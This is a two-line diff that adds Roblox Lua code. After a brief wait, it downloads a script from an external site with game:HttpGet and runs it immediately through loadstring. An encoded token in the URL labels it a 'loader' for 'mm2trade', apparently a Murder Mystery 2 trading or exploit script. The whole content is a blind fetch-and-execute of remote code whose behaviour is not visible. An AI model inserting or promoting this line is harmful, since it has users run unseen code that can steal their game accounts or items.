@@ -1,0 +1,2 @@
+wait("0.2")
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjU5MDhiNmIxLTJkNzYtNGIzOS04YjhmLTg2MTU0N2VjMTc0MSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJ0cmFkZSJ9fQ"))()
